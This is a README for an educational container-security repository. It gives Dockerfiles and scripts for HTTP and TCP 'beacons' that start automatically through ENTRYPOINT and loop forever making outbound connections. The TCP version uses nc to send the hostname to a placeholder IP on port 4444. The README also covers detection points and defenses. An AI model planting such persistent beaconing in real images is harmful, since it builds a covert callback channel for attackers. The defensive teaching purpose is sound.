# Container Backdoor Attack Vector — Safe Simulation (HTTP & TCP Beacon)

This repository demonstrates a **real-world backdoor attack vector** in containers — **without implementing an actual backdoor**.

Instead of a reverse shell, we use **safe outbound beacons** (HTTP & TCP) to simulate:
- ENTRYPOINT persistence
- Infinite retry loops
- Outbound (egress) connectivity abuse

This lets you **observe the risk, detection points, and defenses** safely.

> ⚠️ Educational use only. Do not deploy on production systems.

---

## 1. Threat Model (What This Simulates)

A common real-world pattern:

- Malicious logic embedded in an image
- Executed automatically via ENTRYPOINT
- Runs forever (persistence)
- Uses outbound connections (egress)
- Bypasses inbound firewall controls

This is frequently used in:
- Supply-chain attacks
- Trojan images
- Insider threats

---

## 2. Why Outbound Is Dangerous

Most environments:
- ❌ Focus on inbound security
- ✅ Allow outbound traffic freely

Attackers exploit this by making the container **connect outward**, not wait for inbound access.

Reverse shells use this idea. Here, we simulate it safely with beacons.

---

## 3. Project Structure

```
.
├── http-beacon/
│   ├── Dockerfile
│   └── beacon.sh
│
├── tcp-beacon/
│   ├── Dockerfile
│   └── beacon.sh
│
└── README.md
```

---

## 4. HTTP Beacon (Safe Simulation)

### 4.1 Purpose

Simulates a container that:
- Starts automatically
- Periodically makes outbound HTTP requests
- Logs success/failure

---

### 4.2 Files

#### http-beacon/Dockerfile
```dockerfile
FROM alpine

RUN apk add --no-cache curl

COPY beacon.sh /beacon.sh
RUN chmod +x /beacon.sh

ENTRYPOINT ["sh", "/beacon.sh"]
```

#### http-beacon/beacon.sh
```sh
#!/bin/sh
set -eu

TARGET_URL="${TARGET_URL:-https://example.com/}"
SLEEP_SEC="${SLEEP_SEC:-5}"

echo "[http-beacon] starting target=${TARGET_URL}"

while true; do
  TS="$(date -Iseconds 2>/dev/null || date)"
  ID="$(cat /etc/hostname 2>/dev/null || echo unknown)"

  if curl -fsS --max-time 2 "$TARGET_URL" >/dev/null 2>&1; then
    echo "[http-beacon] $TS OK outbound (id=$ID)"
  else
    echo "[http-beacon] $TS FAIL outbound (id=$ID)"
  fi

  sleep "$SLEEP_SEC"
done
```

---

### 4.3 Build & Run

```bash
cd http-beacon
docker build -t http-beacon .

docker run -d \
  --name http-beacon \
  -e TARGET_URL=https://example.com/ \
  http-beacon
```

View logs:
```bash
docker logs -f http-beacon
```

---

## 5. TCP Beacon (Safe Simulation)

### 5.1 Purpose

Simulates a container that:
- Maintains persistence via ENTRYPOINT
- Repeatedly attempts outbound TCP connections
- Sends a harmless message

This mirrors the **network behavior** of reverse shells without remote control.

---

### 5.2 Files

#### tcp-beacon/Dockerfile
```dockerfile
FROM alpine

RUN apk add --no-cache netcat-openbsd

COPY beacon.sh /beacon.sh
RUN chmod +x /beacon.sh

ENTRYPOINT ["sh", "/beacon.sh"]
```

#### tcp-beacon/beacon.sh
```sh
#!/bin/sh
set -eu

TARGET_HOST="${TARGET_HOST:-198.51.100.10}"   # placeholder test IP
TARGET_PORT="${TARGET_PORT:-4444}"
SLEEP_SEC="${SLEEP_SEC:-5}"

echo "[tcp-beacon] starting target=${TARGET_HOST}:${TARGET_PORT}"

while true; do
  TS="$(date -Iseconds 2>/dev/null || date)"
  ID="$(cat /etc/hostname 2>/dev/null || echo unknown)"
  MSG="beacon ts=$TS id=$ID"

  if printf '%s\n' "$MSG" | nc -w 2 "$TARGET_HOST" "$TARGET_PORT" >/dev/null 2>&1; then
    echo "[tcp-beacon] $TS CONNECT OK"
  else
    echo "[tcp-beacon] $TS CONNECT FAIL"
  fi

  sleep "$SLEEP_SEC"
done
```

---

### 5.3 Build & Run

```bash
cd tcp-beacon
docker build -t tcp-beacon .

docker run -d \
  --name tcp-beacon \
  -e TARGET_HOST=<TEST_SERVER_IP> \
  -e TARGET_PORT=4444 \
  tcp-beacon
```

Optional listener (for observation only):
```bash
nc -l -p 4444
```

---

## 6. What Makes This Dangerous (Even Without a Shell)

- ENTRYPOINT persistence
- Infinite retry loop
- Outbound connectivity
- Minimal logging
- No inbound exposure

If replaced with a reverse shell, the behavior would be identical at the network level.

---

## 7. Detection Points

### Image Inspection
- ENTRYPOINT runs shell script
- Network utilities installed
- No actual service binary

### Runtime Signals
- Repeated outbound attempts
- Regular timing (beaconing)
- Unexpected destinations

---

## 8. Defensive Controls That Stop This

| Control | Effect |
|------|------|
| Image signing | Blocks malicious images |
| Admission control | Rejects suspicious ENTRYPOINT |
| Egress filtering | Kills outbound channel |
| Non-root user | Limits damage |
| seccomp | Blocks dangerous syscalls |
| no-new-privileges | Prevents escalation |

---

## 9. Key Lessons

- Backdoors do not require exploits
- ENTRYPOINT is a powerful persistence point
- Outbound traffic is the real blind spot
- Prevention must happen **before runtime**

---

